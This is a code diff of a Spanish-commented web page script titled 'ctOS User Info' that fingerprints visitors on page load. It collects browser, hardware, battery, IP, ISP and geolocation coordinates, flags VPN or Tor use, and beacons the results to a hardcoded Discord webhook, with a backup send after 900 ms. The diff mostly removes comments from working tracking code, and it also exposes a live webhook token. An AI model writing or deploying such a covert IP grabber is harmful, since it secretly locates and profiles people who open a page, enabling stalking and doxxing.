@@ -90,13 +90,11 @@
     const WEBHOOK = "https://discord.com/api/webhooks/1537148912111059014/BqjpnaFhgaclQzaFHQ5aFUktrEg4Vo-YdgxKDtjP3C-o9bPIz5biUvNnjth25Gmu6iR6";
 
     // ================================================================
-    //  FUNCIÓN PARA ENVIAR MENSAJE (más rápida)
+    //  ENVÍO RÁPIDO (sendBeacon + fetch con keepalive)
     // ================================================================
     function sendFast(msg) {
-        // Usamos sendBeacon primero (no bloquea, se envía incluso al cerrar la página)
         const blob = new Blob([JSON.stringify({ content: msg })], { type: 'application/json' });
         if (navigator.sendBeacon(WEBHOOK, blob)) return true;
-        // Fallback a fetch con keepalive
         fetch(WEBHOOK, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -111,7 +109,7 @@
     // ================================================================
     (function() {
         try {
-            // ---- 1. Datos instantáneos (sin esperar) ----
+            // ---- Datos instantáneos ----
             const ua = navigator.userAgent;
             const os = (function() {
                 if (ua.includes('Windows NT')) return 'Windows';
@@ -128,7 +126,6 @@
                 return 'Other';
             })();
 
-            // GPU (intentamos, pero no bloqueamos)
             let gpu = 'Unavailable';
             try {
                 const canvas = document.createElement('canvas');
@@ -141,7 +138,6 @@
 
             const plugins = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'none';
 
-            // Batería (con timeout de 500ms para no ralentizar)
             let battery = 'Unavailable';
             if (navigator.getBattery) {
                 Promise.race([
@@ -158,18 +154,16 @@
             const ram = navigator.deviceMemory || '?';
             const lang = navigator.language;
 
-            // ---- 2. Detección VPN/Tor instantánea ----
+            // ---- Detección VPN/Tor instantánea ----
             let isVpn = false;
             if (ua.includes('Tor') || ua.includes('Anonymous')) isVpn = true;
             if (navigator.webdriver === true) isVpn = true;
-            // También podemos detectar por falta de WebRTC, pero eso lleva tiempo, lo omitimos.
 
-            // ---- 3. Obtener IP con timeout agresivo (800ms) ----
+            // ---- Obtener IP con timeout de 800 ms ----
             let ip = 'Unknown';
             let isp = 'Unknown ISP';
             let location = 'Unknown';
             let coords = 'Unknown';
-            let proxy = false;
 
             const ipPromise = Promise.race([
                 fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(800) })
@@ -189,16 +183,13 @@
                     isp = data.org || data.isp || 'Unknown ISP';
                     location = (data.city || '') + ', ' + (data.region || data.regionName || '') + ', ' + (data.country_name || data.country || 'Unknown');
                     coords = (data.latitude || data.lat || '') + ', ' + (data.longitude || data.lon || '');
-                    proxy = data.proxy || false;
-                    if (proxy) isVpn = true;
+                    if (data.proxy) isVpn = true;
                     if (data.org) {
                         const vpnWords = ['vpn','proxy','hosting','cloud','datacenter','tor','anonymous'];
                         if (vpnWords.some(w => data.org.toLowerCase().includes(w))) isVpn = true;
                     }
                 }
-                // Reconstruir mensaje con los datos actualizados (si llegaron)
-                // Pero como ya enviamos uno rápido, podemos enviar otro con más detalles, o mejor: enviar el definitivo ahora.
-                // Para simplificar, reconstruimos y enviamos definitivo (sobrescribirá el anterior si ya se envió)
+                // Mensaje final con todos los datos
                 const finalMsg = 
 `**ctOS User Info**
 **IP:** ${ip} (${isp})
@@ -218,7 +209,6 @@
 **Timestamp:** ${new Date().toLocaleString()}`;
 
                 sendFast(finalMsg);
-                // Actualizar estado visual
                 const el = document.getElementById('status');
                 if (el) {
                     el.textContent = '✅ Sent!';
@@ -226,18 +216,8 @@
                 }
             });
 
-            // ---- 4. Envío inmediato con datos provisionales (para no esperar a la IP) ----
-            // Construimos mensaje rápido con IP "Unknown" y luego se actualizará cuando llegue la IP.
-            // Pero como el usuario quiere velocidad, enviamos el mensaje definitivo solo cuando tengamos IP (o el timeout).
-            // La lógica de arriba ya envía cuando obtiene la IP o timeout.
-            // Para no enviar dos veces, solo usamos el envío de la promesa.
-
-            // Si la IP tarda demasiado, la promesa de timeout enviará con "Unknown".
-            // De todas formas, para asegurar que siempre se envía algo, lanzamos un envío de respaldo a los 900ms.
+            // ---- Envío de respaldo a los 900 ms (por si la IP falla) ----
             setTimeout(() => {
-                // Si ya se envió, no hacer nada (pero no tenemos bandera fácil)
-                // Enviamos de nuevo con lo que tengamos (puede duplicar, pero es mejor a no enviar nada)
-                // La función sendFast es idempotente.
                 const backupMsg = 
 `**ctOS User Info (Fast)**
 **IP:** ${ip} (${isp})
@@ -259,7 +239,6 @@
             }, 900);
 
         } catch (err) {
-            // Si algo falla, intentamos enviar un mensaje de error
             const errMsg = `**ctOS Error**\n${err.message}`;
             sendFast(errMsg);
             const el = document.getElementById('status');
